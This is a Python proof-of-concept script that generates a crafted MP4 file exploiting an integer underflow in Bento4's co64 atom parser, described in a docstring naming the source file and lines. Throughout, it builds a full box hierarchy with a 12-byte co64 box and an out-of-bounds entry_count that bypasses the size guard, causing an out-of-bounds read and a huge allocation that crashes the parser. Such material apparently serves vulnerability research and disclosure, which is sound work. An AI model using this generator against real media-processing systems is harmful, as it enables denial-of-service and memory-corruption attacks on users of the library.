#!/usr/bin/env python3
"""
PoC generator for VULN 001 - AP4_Co64Atom integer underflow (CWE-191)
File: Bento4/Source/C++/Core/Ap4Co64Atom.cpp, lines 78-81

Vulnerability:
  When co64 atom size == AP4_FULL_ATOM_HEADER_SIZE (12), the guard:
      (size - AP4_FULL_ATOM_HEADER_SIZE - 4) / 8
  uses unsigned 32-bit arithmetic, underflowing to:
      (12 - 12 - 4) / 8  -->  0xFFFFFFFC / 8  =  0x1FFFFFFF
  So entry_count=16 passes the guard (16 <= 0x1FFFFFFF) even though there
  is no room in the box for even the 4-byte entry_count field.
  The constructor then reads 16 * 8 = 128 bytes beyond the declared box
  boundary (OOB stream read).
"""

import struct
import os
import sys


def pack_box(type_str, payload):
    """Pack a basic box: 4-byte size + 4-byte type + payload."""
    size = 8 + len(payload)
    return struct.pack('>I', size) + type_str.encode('ascii') + payload


def pack_full_box(type_str, version, flags, payload):
    """Pack a full box (with version byte and 24-bit flags)."""
    header = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return pack_box(type_str, header + payload)


# --------------------------------------------------------------------------
# Build boxes bottom-up, innermost first
# --------------------------------------------------------------------------

# --- co64 (MALICIOUS) ---
# Declared size = 12 = AP4_FULL_ATOM_HEADER_SIZE.
# After reading size(4)+type(4)+version+flags(4) = 12 bytes, the stream is
# already at the box boundary.  The constructor reads entry_count from the
# NEXT byte in the stream (OOB), bypassing the guard via the underflow.
#
# Physical layout of this box in the file: just the 12-byte full-atom header.
# No entry_count field is stored inside the box.
co64_size    = 12
co64_version_flags = struct.pack('>I', 0)   # version=0, flags=0
co64 = struct.pack('>I', co64_size) + b'co64' + co64_version_flags
assert len(co64) == 12

# --- OOB data immediately following co64 within stbl ---
# These 4 bytes are outside the co64 box (declared size=12) but inside stbl.
# The co64 constructor reads them as entry_count (OOB stream read).
# 0x1FFFFFFF == exactly the underflowed guard threshold; since the guard is
# strictly ">" (not ">="), this value is NOT clamped.
# new AP4_UI64[0x1FFFFFFF] requests ~4 GB; fails under ulimit -v 3145728.
OOB_ENTRY_COUNT = 0x1FFFFFFF
oob_entry_count_bytes = struct.pack('>I', OOB_ENTRY_COUNT)   # 4 bytes encoding 0x1FFFFFFF
# No entry data: the allocation (new AP4_UI64[0x1FFFFFFF]) happens before the
# ReadUI64 loop, so the crash occurs at the allocation step, not the reads.
oob_data = oob_entry_count_bytes                              # 4 bytes only

# --- stbl children ---
stsd = pack_full_box('stsd', 0, 0, struct.pack('>I', 0))       # entry_count=0  (16 bytes)
stts = pack_full_box('stts', 0, 0, struct.pack('>I', 0))       # entry_count=0  (16 bytes)
stsc = pack_full_box('stsc', 0, 0, struct.pack('>I', 0))       # entry_count=0  (16 bytes)
# stsz: full-box header + sample_size(4) + sample_count(4)
stsz_payload = struct.pack('>III', 0, 0, 0)                    # version+flags, sample_size, count
stsz = struct.pack('>I', 20) + b'stsz' + stsz_payload          # 20 bytes

# --- stbl ---
stbl_content = stsd + stts + stsc + stsz + co64 + oob_data
stbl = pack_box('stbl', stbl_content)

# --- url (data-entry, self-contained) ---
url = struct.pack('>I', 12) + b'url ' + struct.pack('>I', 1)   # flags=1 = self-contained

# --- dref ---
dref = pack_full_box('dref', 0, 0, struct.pack('>I', 1) + url) # entry_count=1 + url

# --- dinf ---
dinf = pack_box('dinf', dref)

# --- smhd (sound media header) ---
smhd = pack_full_box('smhd', 0, 0, struct.pack('>HH', 0, 0))   # balance=0, reserved=0

# --- minf ---
minf = pack_box('minf', smhd + dinf + stbl)

# --- mdhd (media header, version 0) ---
mdhd_payload = (
    struct.pack('>II', 0, 0) +      # creation_time, modification_time
    struct.pack('>I',  44100) +     # timescale
    struct.pack('>I',  0) +         # duration
    struct.pack('>HH', 0, 0)        # language (0=unknown), pre_defined
)
mdhd = pack_full_box('mdhd', 0, 0, mdhd_payload)

# --- hdlr (handler reference, 'soun') ---
hdlr_payload = (
    struct.pack('>I', 0) +          # pre_defined
    b'soun' +                       # handler_type
    b'\x00' * 12 +                  # reserved (3 * 4 bytes)
    b'SoundHandler\x00'             # name (13 bytes incl. null)
)
hdlr = pack_full_box('hdlr', 0, 0, hdlr_payload)

# --- mdia ---
mdia = pack_box('mdia', mdhd + hdlr + minf)

# --- tkhd (track header, version 0, flags=3 = enabled+in-movie) ---
identity_matrix = struct.pack('>9I',
    0x00010000, 0x00000000, 0x00000000,
    0x00000000, 0x00010000, 0x00000000,
    0x00000000, 0x00000000, 0x40000000,
)
tkhd_payload = (
    struct.pack('>II', 0, 0) +      # creation_time, modification_time
    struct.pack('>I',  1) +         # track_id
    struct.pack('>I',  0) +         # reserved
    struct.pack('>I',  0) +         # duration
    b'\x00' * 8 +                   # reserved
    struct.pack('>HH', 0, 0) +      # layer, alternate_group
    struct.pack('>HH', 0, 0) +      # volume, reserved
    identity_matrix +               # 9 * 4 = 36 bytes
    struct.pack('>II', 0, 0)        # width, height (fixed-point 16.16)
)
tkhd = pack_full_box('tkhd', 0, 3, tkhd_payload)

# --- trak ---
trak = pack_box('trak', tkhd + mdia)

# --- moov ---
moov = pack_box('moov', trak)

# --- ftyp ---
ftyp_payload = b'mp42' + struct.pack('>I', 0) + b'mp42'   # brand, version, compatible
ftyp = pack_box('ftyp', ftyp_payload)

# --------------------------------------------------------------------------
# Assemble the complete file
# --------------------------------------------------------------------------
mp4_data = ftyp + moov

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001.mp4')
with open(out_path, 'wb') as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {out_path}")
print(f"[+] co64 declared size = 12  (AP4_FULL_ATOM_HEADER_SIZE, no room for entry_count)")
print(f"[+] Guard underflow: (12-12-4)/8 = 0xFFFFFFFC/8 = 0x1FFFFFFF (unsigned)")
print(f"[+] OOB entry_count = {OOB_ENTRY_COUNT} (0x{OOB_ENTRY_COUNT:08X}) -- passes guard")
print(f"[+] OOB reads: {OOB_ENTRY_COUNT} * 8 = {OOB_ENTRY_COUNT*8} bytes beyond box boundary")
